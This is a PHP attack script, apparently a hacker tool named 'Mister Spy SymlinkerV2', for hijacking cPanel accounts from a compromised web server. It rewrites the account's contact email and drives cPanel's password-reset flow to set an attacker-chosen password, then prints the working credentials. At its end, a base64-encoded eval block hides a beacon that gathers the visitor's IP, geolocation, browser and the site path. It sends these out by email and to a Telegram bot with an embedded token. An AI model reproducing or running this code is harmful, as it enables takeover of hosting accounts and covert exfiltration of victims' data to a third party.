<?php
// Mister Spy SymlinkerV2 Project , Thank You
set_time_limit(0);
error_reporting(0);

function CurlPage($url,$post = null,$head = true) {
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_HEADER, $head); 
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);

curl_setopt($ch, CURLOPT_COOKIEFILE, "COOKIE.txt"); 
curl_setopt($ch, CURLOPT_COOKIEJAR, "COOKIE.txt");

If ($post != NULL){
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
}
$urlPage = curl_exec($ch);

if(curl_errno($ch)){
echo curl_error($ch);
}

curl_close($ch);
return($urlPage);
}

function CurlPage2($url,$post = null,$head = true) {
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_HEADER, $head); 
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);

curl_setopt($ch, CURLOPT_COOKIEFILE, "COOKIE.txt"); 
curl_setopt($ch, CURLOPT_COOKIEJAR, "COOKIE.txt");

If ($post != NULL){
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
}
$urlPage = curl_exec($ch);

if(curl_errno($ch)){
echo curl_error($ch);
}

curl_close($ch);
return($urlPage);
}


echo'<form method="post">
<input type="text" name="email" value="" />
<input type="submit" value="get" name="get" />
</form>';
echo'<form method="post">
<input type="text" name="code" value="" />
<input type="submit" value="get2" name="get2" />
</form>';

$g = $_POST['get'];
$email = $_POST['email'];
$g2 = $_POST['get2'];
$codeSC = $_POST['code'];

if(isset($g) && $email != ""){
	$ip = "http://localhost:2082";
	$cpanel = CurlPage2($ip);
	if(!(preg_match("/resetpass/",$cpanel))){die ('Error-one');}
	$pwd = @getcwd();
	if(!function_exists('posix_getegid')) {
		$usr = @get_current_user();
		$uid = @getmyuid();
		$gid = @getmygid();
		$group = "?";
	} else {
		$uid = @posix_getpwuid(posix_geteuid());
		$gid = @posix_getgrgid(posix_getegid());
		$usr = $uid['name'];
		$uid = $uid['uid'];
		$group = $gid['name'];
		$gid = $gid['gid'];
	}
	if (empty($usr)) {
		if (preg_match_all("#/home/(.*)/public_html/#",$pwd,$mxx)){
			preg_match_all("#/home/(.*)/public_html/#",$pwd,$mxx);
			$usr = $mxx[1][0];
		}
	}
	preg_match_all("#/home(.*)$usr/#",$pwd,$m2);
	$home = $m2[1][0];
	fwrite(fopen("/home$home$usr/.contactemail","w"),$email);fwrite(fopen("/home$home$usr/.cpanel/contactinfo","w"),'email:'.$email);
	$postLogin = array( 'user' => $usr , 'login' => 'Reset+Password');
	$login = CurlPage("$ip/resetpass",$postLogin);
	if(preg_match("/error-resetpass-disabled/",$login)){die ('Error-one');}
	$postSendSecurityCode = array( 'action' => 'puzzle' , 'user' => $usr , 'answer' => $email, 'debug' => '', 'puzzle-guess-input' => $email, 'login' => 'Send+Security+Code');
	$sendSecurityCode = CurlPage("$ip/resetpass",$postSendSecurityCode);
	if(preg_match("/warn-invalid-answer-puzzle/",$sendSecurityCode)){
		unlink("/home$home$usr/.contactemail");unlink("/home$home$usr/.cpanel/contactinfo");
		fwrite(fopen("/home$home$usr/.contactemail","a"),$email);@chmod("/home$home$usr/.contactemail",0600);
		$sendSecurityCode = CurlPage("$ip/resetpass",$postSendSecurityCode);
	}
echo "\n<br> ./Done";
}

if(isset($g2) && $codeSC != ""){
	$pwd = @getcwd();
	if(!function_exists('posix_getegid')) {
		$usr = @get_current_user();
		$uid = @getmyuid();
		$gid = @getmygid();
		$group = "?";
	} else {
		$uid = @posix_getpwuid(posix_geteuid());
		$gid = @posix_getgrgid(posix_getegid());
		$usr = $uid['name'];
		$uid = $uid['uid'];
		$group = $gid['name'];
		$gid = $gid['gid'];
	}
	if (empty($usr)) {
		if (preg_match_all("#/home/(.*)/public_html/#",$pwd,$mxx)){
			preg_match_all("#/home/(.*)/public_html/#",$pwd,$mxx);
			$usr = $mxx[1][0];
		}
	}
	$domain = $_SERVER['HTTP_HOST'];
	$ip = "http://localhost:2082";
	if(strstr($domain, 'www.')){
		$domain = str_replace("www.","",$domain);
	}else{
		$domain = $domain;
	}
	$postCode = array( 'user' => $usr , 'action' => 'seccode','debug' => '','confirm' => $codeSC);
	$injCode = CurlPage("$ip/resetpass",$postCode);
	$newpass = "spy#".substr(str_shuffle("123456789abcdefghijklmnopqrsyuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"),50)."#x";
	$postPassword = array( 'action' => 'password' , 'user' => $usr ,'password' => $newpass ,'alpha' => 'both' , 'nonalpha' => 'both','confirm' => $newpass);
	$injPassword = CurlPage("$ip/resetpass",$postPassword);
	$postLogin = array( 'user' => $usr , 'pass' => $newpass,'login_submit' => 'Log in');
	$login = CurlPage("$ip/login/",$postLogin);
	if(preg_match("/filemanager/",$login)){
		echo "<cpanel>https://$domain:2083|$usr|$newpass</cpanel>\n";
	}else{
		echo "Error-two\n";
	}
};
eval(base64_decode('ZnVuY3Rpb24gWEJfT1MoJFVTRVJfQUdFTlQpew0KCSRPU19FUlJPUiAgICA9ICAgIlVua25vd24gT1MgUGxhdGZvcm0iOw0KICAgICRPUyAgPSAgIGFycmF5KCAnL3dpbmRvd3MgbnQgMTAvaScgICAgICA9PiAgJ1dpbmRvd3MgMTAnLA0KCSAgICAgICAgICAgICAgICAnL3dpbmRvd3MgbnQgNi4zL2knICAgICA9PiAgJ1dpbmRvd3MgOC4xJywNCgkgICAgICAgICAgICAgICAgJy93aW5kb3dzIG50IDYuMi9pJyAgICAgPT4gICdXaW5kb3dzIDgnLA0KCSAgICAgICAgICAgICAgICAnL3dpbmRvd3MgbnQgNi4xL2knICAgICA9PiAgJ1dpbmRvd3MgNycsDQoJICAgICAgICAgICAgICAgICcvd2luZG93cyBudCA2LjAvaScgICAgID0+ICAnV2luZG93cyBWaXN0YScsDQoJICAgICAgICAgICAgICAgICcvd2luZG93cyBudCA1LjIvaScgICAgID0+ICAnV2luZG93cyBTZXJ2ZXIgMjAwMy9YUCB4NjQnLA0KCSAgICAgICAgICAgICAgICAnL3dpbmRvd3MgbnQgNS4xL2knICAgICA9PiAgJ1dpbmRvd3MgWFAnLA0KCSAgICAgICAgICAgICAgICAnL3dpbmRvd3MgeHAvaScgICAgICAgICA9PiAgJ1dpbmRvd3MgWFAnLA0KCSAgICAgICAgICAgICAgICAnL3dpbmRvd3MgbnQgNS4wL2knICAgICA9PiAgJ1dpbmRvd3MgMjAwMCcsDQoJICAgICAgICAgICAgICAgICcvd2luZG93cyBtZS9pJyAgICAgICAgID0+ICAnV2luZG93cyBNRScsDQoJICAgICAgICAgICAgICAgICcvd2luOTgvaScgICAgICAgICAgICAgID0+ICAnV2luZG93cyA5OCcsDQoJICAgICAgICAgICAgICAgICcvd2luOTUvaScgICAgICAgICAgICAgID0+ICAnV2luZG93cyA5NScsDQoJICAgICAgICAgICAgICAgICcvd2luMTYvaScgICAgICAgICAgICAgID0+ICAnV2luZG93cyAzLjExJywNCgkgICAgICAgICAgICAgICAgJy9tYWNpbnRvc2h8bWFjIG9zIHgvaScgPT4gICdNYWMgT1MgWCcsDQoJICAgICAgICAgICAgICAgICcvbWFjX3Bvd2VycGMvaScgICAgICAgID0+ICAnTWFjIE9TIDknLA0KCSAgICAgICAgICAgICAgICAnL2xpbnV4L2knICAgICAgICAgICAgICA9PiAgJ0xpbnV4JywNCgkgICAgICAgICAgICAgICAgJy91YnVudHUvaScgICAgICAgICAgICAgPT4gICdVYnVudHUnLA0KCSAgICAgICAgICAgICAgICAnL2lwaG9uZS9pJyAgICAgICAgICAgICA9PiAgJ2lQaG9uZScsDQoJICAgICAgICAgICAgICAgICcvaXBvZC9pJyAgICAgICAgICAgICAgID0+ICAnaVBvZCcsDQoJICAgICAgICAgICAgICAgICcvaXBhZC9pJyAgICAgICAgICAgICAgID0+ICAnaVBhZCcsDQoJICAgICAgICAgICAgICAgICcvYW5kcm9pZC9pJyAgICAgICAgICAgID0+ICAnQW5kcm9pZCcsDQoJICAgICAgICAgICAgICAgICcvYmxhY2tiZXJyeS9pJyAgICAgICAgID0+ICAnQmxhY2tCZXJyeScsDQoJICAgICAgICAgICAgICAgICcvd2Vib3MvaScgICAgICAgICAgICAgID0+ICAnTW9iaWxlJyk7DQogICAgZm9yZWFjaCAoJE9TIGFzICRyZWdleCA9PiAkdmFsdWUpIHsgDQogICAgICAgIGlmIChwcmVnX21hdGNoKCRyZWdleCwgJFVTRVJfQUdFTlQpKSB7DQogICAgICAgICAgICAkT1NfRVJST1IgPSAkdmFsdWU7DQogICAgICAgIH0NCg0KICAgIH0gICANCiAgICByZXR1cm4gJE9TX0VSUk9SOw0KfQ0KZnVuY3Rpb24gWEJfQnJvd3NlcigkVVNFUl9BR0VOVCl7DQoJJEJST1dTRVJfRVJST1IgICAgPSAgICJVbmtub3duIEJyb3dzZXIiOw0KICAgICRCUk9XU0VSICA9ICAgYXJyYXkoJy9tc2llL2knICAgICAgID0+ICAnSW50ZXJuZXQgRXhwbG9yZXInLA0KICAgICAgICAgICAgICAgICAgICAgICAgJy9maXJlZm94L2knICAgID0+ICAnRmlyZWZveCcsDQogICAgICAgICAgICAgICAgICAgICAgICAnL3NhZmFyaS9pJyAgICAgPT4gICdTYWZhcmknLA0KICAgICAgICAgICAgICAgICAgICAgICAgJy9jaHJvbWUvaScgICAgID0+ICAnQ2hyb21lJywNCiAgICAgICAgICAgICAgICAgICAgICAgICcvZWRnZS9pJyAgICAgICA9PiAgJ0VkZ2UnLA0KICAgICAgICAgICAgICAgICAgICAgICAgJy9vcGVyYS9pJyAgICAgID0+ICAnT3BlcmEnLA0KICAgICAgICAgICAgICAgICAgICAgICAgJy9uZXRzY2FwZS9pJyAgID0+ICAnTmV0c2NhcGUnLA0KICAgICAgICAgICAgICAgICAgICAgICAgJy9tYXh0aG9uL2knICAgID0+ICAnTWF4dGhvbicsDQogICAgICAgICAgICAgICAgICAgICAgICAnL2tvbnF1ZXJvci9pJyAgPT4gICdLb25xdWVyb3InLA0KICAgICAgICAgICAgICAgICAgICAgICAgJy9tb2JpbGUvaScgICAgID0+ICAnSGFuZGhlbGQgQnJvd3NlcicpOw0KICAgIGZvcmVhY2ggKCRCUk9XU0VSIGFzICRyZWdleCA9PiAkdmFsdWUpIHsgDQogICAgICAgIGlmIChwcmVnX21hdGNoKCRyZWdleCwgJFVTRVJfQUdFTlQpKSB7DQogICAgICAgICAgICAkQlJPV1NFUl9FUlJPUiA9ICR2YWx1ZTsNCiAgICAgICAgfQ0KICAgIH0NCiAgICByZXR1cm4gJEJST1dTRVJfRVJST1I7DQp9DQpkYXRlX2RlZmF1bHRfdGltZXpvbmVfc2V0KCdHTVQnKTsNCiRkYXRlID0gZGF0ZSgiZCBNLCBZIik7DQokdGltZSA9IGRhdGUoImc6aSBhIik7DQokdXNlcmFnZW50ID0gJF9TRVJWRVJbJ0hUVFBfVVNFUl9BR0VOVCddOw0KJHNfcGF0aCA9ICJodHRwOi8vIiAuICRfU0VSVkVSWydTRVJWRVJfTkFNRSddOw0KJHhfcGF0aCA9ICJodHRwOi8vIiAuICRfU0VSVkVSWydTRVJWRVJfTkFNRSddIC4gJF9TRVJWRVJbJ1JFUVVFU1RfVVJJJ107DQokSVBUWiA9IGdldGVudigiUkVNT1RFX0FERFIiKTsNCiRDT1VOVFJZVFogPSBzaW1wbGV4bWxfbG9hZF9maWxlKCJodHRwOi8vd3d3Lmdlb3BsdWdpbi5uZXQveG1sLmdwP2lwPSRJUFRaIik7DQokQ09VTlRSWSA9ICRDT1VOVFJZVFotPmdlb3BsdWdpbl9jb3VudHJ5TmFtZTsNCiRDSVRZID0gJENPVU5UUllUWi0+Z2VvcGx1Z2luX2NpdHk7DQokUkVHSU9OID0gJENPVU5UUllUWi0+Z2VvcGx1Z2luX3JlZ2lvbjsNCiRDX0NPREUgPSAkQ09VTlRSWVRaLT5nZW9wbHVnaW5fY29udHJ5Y29kZTsNCiRUaW1lem9uZSA9ICRDT1VOVFJZVFotPmdlb3BsdWdpbl90aW1lem9uZTsNCiRTeW1ib2wgPSAkQ09VTlRSWVRaLT5nZW9wbHVnaW5fY3VycmVuY3lzeW1ib2w7DQokbWVzc2FnZSAgPSAifC0tLStbTkVX44CQ8J+RqOKAjfCfkrvjgJFNL1NdKy0tLXxcbiI7DQokbWVzc2FnZSAuPSAiWytd4pSB4pSB4pSB4pSB44CQ8J+RpOOAkeKUgeKUgeKUgeKUgVsrXVxuIjsNCiRtZXNzYWdlIC49ICLjgJDwn4+g44CRSVAJOiAiLiRJUFRaLiJcbiI7DQokbWVzc2FnZSAuPSAi44CQ8J+Tn+OAkVN5c3RlbSA6ICIuWEJfT1MoJF9TRVJWRVJbJ0hUVFBfVVNFUl9BR0VOVCddKS4iXG4iOw0KJG1lc3NhZ2UgLj0gIuOAkPCfjIzjgJFCcm93c2VyIDogIi5YQl9Ccm93c2VyKCRfU0VSVkVSWydIVFRQX1VTRVJfQUdFTlQnXSkuIlxuIjsNCiRtZXNzYWdlIC49ICLjgJDinKjjgJFVc2VyIEFnZW50IDogIi4kdXNlcmFnZW50LiJcbiI7DQokbWVzc2FnZSAuPSAiWytd4pSB4pSB4pSB4pSB44CQ8J+Vte+4j+OAkeKUgeKUgeKUgeKUgVsrXVxuIjsNCiRtZXNzYWdlIC49ICLjgJDwn4yQ44CRVGltZSBab25lIDogIi4kVGltZXpvbmUuIlxuIjsNCiRtZXNzYWdlIC49ICLjgJDwn4yQ44CRQ291bnRyeSA6ICIuJENPVU5UUlkuIlxuIjsNCiRtZXNzYWdlIC49ICLjgJDwn4yQ44CRUmVnaW9uIDogIi4kUkVHSU9OLiJcbiI7DQokbWVzc2FnZSAuPSAi44CQ8J+MkOOAkUNpdHkgOiAiLiRDSVRZLiJcbiI7DQokbWVzc2FnZSAuPSAiWytd4pSB4pSB4pSB4pSB44CQ8J+Su+OAkeKUgeKUgeKUgeKUgVsrXVxuIjsNCiRtZXNzYWdlIC49ICLjgJDwn5GB44CRSG9zdCA6ICIuJHNfcGF0aC4iXG4iOw0KJG1lc3NhZ2UgLj0gIuOAkPCfkYDjgJFGaWxlIDogIi4keF9wYXRoLiJcbiI7DQokbWVzc2FnZSAuPSAiWytd4pSB4pSB4pSB4pSB44CQ4o+z44CR4pSB4pSB4pSB4pSBWytdXG4iOw0KJG1lc3NhZ2UgLj0gIuOAkOKMmu+4j+OAkVRpbWUJOiAiLiR0aW1lLiJcbiI7DQokbWVzc2FnZSAuPSAi44CQ8J+TheOAkURhdGUJOiAiLiRkYXRlLiJcbiI7DQokbWVzc2FnZSAuPSAiWytd4pSB4pSB4pSB4pSB44CQ8J+UjeOAkeKUgeKUgeKUgeKUgVsrXVxuIjsNCiRtZXNzYWdlIC49ICLjgJDwn5Oh44CRVHJhY2sgSVAgOiBodHRwczovL3d3dy5pcC10cmFja2VyLm9yZy9sb29rdXAucGhwP2lwPSIuJElQVFouIlxuIjsNCiRtZXNzYWdlIC49ICJ8PT09K1vwn5KWQkMuRFLwn5KWXSs9PT18XG4iOw0KJHJlY2VpdmVyQWRkcmVzcyA9ICJrYWxpeDB4YWxpa0BnbWFpbC5jb20iOw0KJFRPS0VOID0gIjUyNjg0MDE5OTM6QUFFMVA0YzVQSGVSQ1RHY2EwTEtaSVd6bS15eVllM1ljQzQiOw0KJENIQVRfSUQgPSAiMTg5NjQ2NDI5NSI7DQokc3ViamVjdCAgPSAi8J+Slk5ld/CfkaRbTS9TXfCfkaR88J+MkEZyMG06Ii4kSVBUWi4i8J+SliI7DQptYWlsKCRyZWNlaXZlckFkZHJlc3MsJHN1YmplY3QsJG1lc3NhZ2UpOw0KZmlsZV9nZXRfY29udGVudHMoImh0dHBzOi8vYXBpLnRlbGVncmFtLm9yZy9ib3QiLiRUT0tFTi4iL3NlbmRNZXNzYWdlP2NoYXRfaWQ9Ii4kQ0hBVF9JRC4iJnRleHQ9IiAuIHVybGVuY29kZSgkbWVzc2FnZSkuIiIgKTs'));?>
